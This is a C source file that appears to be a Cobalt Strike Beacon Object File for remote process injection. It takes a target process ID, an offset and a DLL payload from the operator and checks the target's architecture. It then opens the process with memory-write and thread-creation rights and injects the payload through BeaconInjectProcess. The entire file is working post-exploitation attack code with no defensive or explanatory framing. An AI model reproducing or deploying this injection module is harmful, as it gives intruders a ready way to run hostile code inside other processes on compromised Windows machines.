#include <windows.h>
#include "beacon.h"

/* Windows API calls */
DECLSPEC_IMPORT WINBASEAPI WINBOOL WINAPI KERNEL32$IsWow64Process (HANDLE hProcess, PBOOL Wow64Process);
DECLSPEC_IMPORT WINBASEAPI HANDLE  WINAPI KERNEL32$GetCurrentProcess (VOID);
DECLSPEC_IMPORT WINBASEAPI HANDLE  WINAPI KERNEL32$OpenProcess (DWORD dwDesiredAccess, WINBOOL bInheritHandle, DWORD dwProcessId);
DECLSPEC_IMPORT WINBASEAPI DWORD   WINAPI KERNEL32$GetLastError (VOID);
DECLSPEC_IMPORT WINBASEAPI WINBOOL WINAPI KERNEL32$CloseHandle (HANDLE hObject);

/* is this an x64 BOF */
BOOL is_x64() {
#if defined _M_X64
   return TRUE;
#elif defined _M_IX86
   return FALSE;
#endif
}

/* is this a 64-bit or 32-bit process? */
BOOL is_wow64(HANDLE process) {
   BOOL bIsWow64 = FALSE;

   if (!KERNEL32$IsWow64Process(process, &bIsWow64)) {
      return FALSE;
   }
   return bIsWow64;
}

/* check if a process is x64 or not */
BOOL is_x64_process(HANDLE process) {
   if (is_x64() || is_wow64(KERNEL32$GetCurrentProcess())) {
      return !is_wow64(process);
   }

   return FALSE;
}

/* See gox86 and gox64 entry points */
void go(char * args, int alen, BOOL x86) {
   HANDLE              hProcess;
   datap               parser;
   int                 pid;
   int                 offset;
   char *              dllPtr;
   int                 dllLen;

   /* Extract the arguments */
   BeaconDataParse(&parser, args, alen);
   pid = BeaconDataInt(&parser);
   offset = BeaconDataInt(&parser);
   dllPtr = BeaconDataExtract(&parser, &dllLen);

   /* Open a handle to the process, for injection. */
   hProcess = KERNEL32$OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
   if (hProcess == INVALID_HANDLE_VALUE || hProcess == 0) {
      BeaconPrintf(CALLBACK_ERROR, "Unable to open process %d : %d", pid, KERNEL32$GetLastError());
      return;
   }

   /* Check that we can inject the content into the process. */
   if (!is_x64_process(hProcess) && x86 == FALSE ) {
      BeaconPrintf(CALLBACK_ERROR, "%d is an x86 process (can't inject x64 content)", pid);
      return;
   }
   if (is_x64_process(hProcess) && x86 == TRUE) {
      BeaconPrintf(CALLBACK_ERROR, "%d is an x64 process (can't inject x86 content)", pid);
      return;
   }

   /* inject into the process */
   BeaconInjectProcess(hProcess, pid, dllPtr, dllLen, offset, NULL, 0);

   /* Clean up */
   KERNEL32$CloseHandle(hProcess);
}

void gox86(char * args, int alen) {
   go(args, alen, TRUE);
}

void gox64(char * args, int alen) {
   go(args, alen, FALSE);
}
